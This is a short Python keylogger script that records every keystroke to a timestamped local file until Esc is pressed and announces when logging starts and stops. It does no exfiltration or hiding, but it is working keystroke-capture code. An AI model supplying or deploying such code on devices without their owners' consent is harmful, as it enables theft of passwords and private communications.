# Importing necessary modules
import keyboard
import datetime

# Function to log keystrokes
def keylogger():
    # Define the file name with current date and time
    log_file = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + "_keylog.txt"
    
    # Inform the user about the start of logging
    print("Keylogging started. Press 'Esc' to stop and save the logs.")

    # Open a file to write the keystrokes
    with open(log_file, "w") as file:
        file.write("Keylogger Started: \n" + str(datetime.datetime.now()) + "\n")
        
        # Start listening for key presses
        keyboard.start_recording()
        
        # Loop to record keystrokes until 'Esc' key is pressed
        while True:
            event = keyboard.read_event()
            
            # Check if 'Esc' key is pressed to stop the keylogger
            if event.name == 'esc':
                # Inform the user about stopping the logging
                print("Keylogging stopped. Logs saved in", log_file)
                
                # Stop recording
                keyboard.stop_recording()
                break
                
            else:
                # Write the pressed key to the log file
                file.write(str(event) + "\n")

# Call the keylogger function to start logging
keylogger()
